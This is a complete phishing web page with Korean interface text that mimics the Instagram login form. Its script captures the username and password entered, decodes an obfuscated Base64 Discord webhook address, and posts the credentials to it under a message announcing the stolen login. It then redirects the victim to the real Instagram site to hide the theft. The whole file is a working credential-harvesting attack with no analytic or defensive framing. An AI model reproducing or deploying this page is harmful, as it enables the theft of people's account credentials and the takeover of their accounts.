<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            width: 350px;
            text-align: center;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 30px 40px;
            margin-bottom: 10px;
            border-radius: 1px;
        }
        .logo {
            font-family: 'Billabong', cursive, sans-serif;
            font-size: 51px;
            font-weight: normal;
            margin: 22px 0 35px 0;
            color: #262626;
        }
        .input-field {
            position: relative;
            margin-bottom: 6px;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            color: #262626;
            font-size: 12px;
            padding: 12px 9px 8px 9px;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            background: #0095f6;
            border: 1px solid transparent;
            border-radius: 4px;
            color: white;
            font-size: 14px;
            font-weight: 600;
            padding: 7px;
            margin-top: 14px;
            cursor: pointer;
        }
        button:active {
            opacity: 0.7;
        }
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            font-size: 14px;
            color: #262626;
        }
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            <form id="loginForm">
                <div class="input-field">
                    <input type="text" id="username" name="username" placeholder="전화번호, 사용자 이름 또는 이메일" required>
                </div>
                <div class="input-field">
                    <input type="password" id="password" name="password" placeholder="비밀번호" required>
                </div>
                <button type="submit">로그인</button>
            </form>
        </div>
        <div class="signup-box">
            계정이 없으신가요? <a href="#">가입하기</a>
        </div>
    </div>

    <script>
        // Base64로 인코딩된 디스코드 웹훅 주소 (노출 방지용)
        const ENCODED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MDEwNDgyNzY3MjAwNjcxNy9wZU1ZaVAyNlRxNVpsSW0zZi1iQzR0TDJUmZnM3RXX2VIa0xubE5vcFFHaDRiRlZzUVpORTc2bU5Ma1JaSFNGOUswSVQ=";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const webhookUrl = atob(ENCODED_WEBHOOK);

            const payload = {
                content: `🎯 **인스타 로그인 정보 획득!**\n- **ID:** \`${username}\`\n- **PW:** \`${password}\``
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            }).finally(() => {
                // 전송 후 실제 인스타그램 페이지로 이동
                window.location.href = "https://www.instagram.com";
            });
        });
    </script>
</body>
</html>
